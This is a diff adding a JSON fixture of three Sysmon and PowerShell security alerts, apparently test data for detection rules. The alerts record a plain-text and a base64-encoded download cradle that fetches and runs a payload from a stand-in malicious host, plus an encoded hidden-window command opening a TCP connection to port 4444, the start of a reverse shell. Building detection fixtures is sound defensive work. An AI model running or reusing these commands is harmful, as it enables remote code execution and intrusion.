@@ -1,0 +1,143 @@
+[
+  {
+    "rule": {
+      "level": 12,
+      "description": "Sysmon - Process Creation - PowerShell with EncodedCommand",
+      "id": "184720",
+      "groups": ["sysmon", "sysmon_process-creation"]
+    },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "eventID": "1",
+          "version": "5",
+          "level": "4",
+          "task": "1",
+          "opcode": "0",
+          "keywords": "0x8000000000000000",
+          "systemTime": "2025-01-15T16:05:22.104Z",
+          "eventRecordID": "104701",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "WORKSTATION-01.corp.local"
+        },
+        "eventdata": {
+          "utcTime": "2025-01-15 16:05:22.091",
+          "processGuid": "{A1B2C3D4-2211-65AE-0100-000000002100}",
+          "processId": "8412",
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "fileVersion": "10.0.19041.1",
+          "description": "Windows PowerShell",
+          "product": "Microsoft® Windows® Operating System",
+          "company": "Microsoft Corporation",
+          "originalFileName": "PowerShell.EXE",
+          "commandLine": "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA",
+          "currentDirectory": "C:\\Users\\admin\\",
+          "user": "CORP\\admin",
+          "logonGuid": "{A1B2C3D4-0901-65AE-B3A2-110000000000}",
+          "logonId": "0x11a2b3",
+          "terminalSessionId": "1",
+          "integrityLevel": "High",
+          "hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+          "parentProcessGuid": "{A1B2C3D4-2200-65AE-0100-000000002000}",
+          "parentProcessId": "5624",
+          "parentImage": "C:\\Windows\\System32\\cmd.exe",
+          "parentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\"",
+          "parentUser": "CORP\\admin"
+        }
+      }
+    },
+    "location": "EventChannel",
+    "timestamp": "2025-01-15T16:05:22.104+0000"
+  },
+  {
+    "rule": {
+      "level": 12,
+      "description": "PowerShell ScriptBlock Logging - Suspicious download cradle detected",
+      "id": "191640",
+      "groups": ["windows", "powershell"]
+    },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-PowerShell",
+          "providerGuid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
+          "eventID": "4104",
+          "version": "1",
+          "level": "5",
+          "task": "2",
+          "opcode": "15",
+          "keywords": "0x0",
+          "systemTime": "2025-01-15T16:05:23.217Z",
+          "eventRecordID": "38921",
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "computer": "WORKSTATION-01.corp.local"
+        },
+        "eventdata": {
+          "messageNumber": "1",
+          "messageTotal": "1",
+          "scriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload')",
+          "scriptBlockId": "a3f1c7e2-9d4b-4e8a-b6c1-d5e2f3a4b7c8",
+          "path": "",
+          "processId": "8412",
+          "utcTime": "2025-01-15 16:05:23.210"
+        }
+      }
+    },
+    "location": "EventChannel",
+    "timestamp": "2025-01-15T16:05:23.217+0000"
+  },
+  {
+    "rule": {
+      "level": 14,
+      "description": "Sysmon - Process Creation - PowerShell with EncodedCommand and hidden window",
+      "id": "184720",
+      "groups": ["sysmon", "sysmon_process-creation"]
+    },
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "eventID": "1",
+          "version": "5",
+          "level": "4",
+          "task": "1",
+          "opcode": "0",
+          "keywords": "0x8000000000000000",
+          "systemTime": "2025-01-15T18:42:11.558Z",
+          "eventRecordID": "104890",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "WORKSTATION-01.corp.local"
+        },
+        "eventdata": {
+          "utcTime": "2025-01-15 18:42:11.543",
+          "processGuid": "{A1B2C3D4-2244-65AE-0100-000000002200}",
+          "processId": "10284",
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "fileVersion": "10.0.19041.1",
+          "description": "Windows PowerShell",
+          "product": "Microsoft® Windows® Operating System",
+          "company": "Microsoft Corporation",
+          "originalFileName": "PowerShell.EXE",
+          "commandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADAAJwAsADQANAA0ADQAKQA=",
+          "currentDirectory": "C:\\Users\\jsmith\\",
+          "user": "CORP\\jsmith",
+          "logonGuid": "{A1B2C3D4-0A22-65AE-C4D5-220000000000}",
+          "logonId": "0x22d5c4",
+          "terminalSessionId": "1",
+          "integrityLevel": "Medium",
+          "hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+          "parentProcessGuid": "{A1B2C3D4-0A10-65AE-0100-000000000800}",
+          "parentProcessId": "4120",
+          "parentImage": "C:\\Windows\\explorer.exe",
+          "parentCommandLine": "C:\\Windows\\explorer.exe",
+          "parentUser": "CORP\\jsmith"
+        }
+      }
+    },
+    "location": "EventChannel",
+    "timestamp": "2025-01-15T18:42:11.558+0000"
+  }
+]
